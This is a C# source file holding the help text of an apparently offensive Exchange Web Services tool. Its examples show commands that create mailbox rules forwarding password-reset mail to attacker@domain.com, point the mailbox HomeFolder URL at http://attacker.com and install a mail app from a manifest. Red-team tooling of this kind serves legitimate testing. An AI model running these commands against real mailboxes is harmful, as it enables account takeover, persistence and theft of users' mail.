using System;

namespace EWS
{
    public class Help
    {
        public static void ShowExamples()
        {
            Console.WriteLine("  Examples:");
            Console.WriteLine("  Set auto-forward rules");
            Console.WriteLine("    ews -e user@domain.com -p Passw0rd! --rule -n TestRule -s password,reset -f attacker@domain.com");
            Console.WriteLine("    ews -e user@domain.com -p Passw0rd! --rule -n TestRule -b \"This is your new password\" -f attacker@domain.com");
            Console.WriteLine("  Set HomeFolder URL");
            Console.WriteLine("    ews -e user@domain.com -p Passw0rd! --homefolder -u http://attacker.com");
            Console.WriteLine("  Install MailApp");
            Console.WriteLine("    ews -e user@domain.com -p Passw0rd! --installapp -m C:\\Users\\Rasta\\Desktop\\manifest.xml");
        }
    }
}
